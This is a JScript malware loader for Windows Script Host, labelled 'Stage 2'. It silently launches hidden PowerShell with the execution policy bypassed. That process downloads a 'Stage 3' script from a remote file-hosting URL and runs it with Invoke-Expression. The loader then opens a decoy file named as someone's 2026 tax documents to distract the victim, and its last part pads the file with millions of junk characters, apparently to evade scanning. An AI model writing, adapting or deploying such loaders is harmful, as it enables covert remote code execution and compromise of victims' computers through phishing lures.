// =============================================
// Reliable Stage 2 Loader
// =============================================

(function() {
    try {
        var wsh = new ActiveXObject("WScript.Shell");

        // Your working Stage 3 URL
        var stage3Url = "https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_4f21a301d24a4aab93e4c4a930cb1ce4.txt";

        // More reliable way to run Stage 3
        var stage3Cmd = '-ep Bypass -WindowStyle Hidden -c "powershell -c \\"Invoke-Expression (irm \'' + stage3Url + '\')\\""';
        wsh.Run("powershell.exe " + stage3Cmd, 0, false);

        WScript.Sleep(900);

        // Decoy
        var decoyCmd = '-ep Bypass -WindowStyle Hidden -c "Invoke-WebRequest -Uri \'https://www.google.com\' -OutFile \'$env:USERPROFILE\\Downloads\\Michael Williams Taxdocs 2026.pdf\' -UseBasicParsing; Start-Process \'$env:USERPROFILE\\Downloads\\Michael Williams Taxdocs 2026.pdf\'"';
        wsh.Run("powershell.exe " + decoyCmd, 0, false);

    } catch(e) {}

    // Junk data
    var junk = "";
    for(var i = 0; i < 9200000; i++) {
        junk += "x";
    }
})();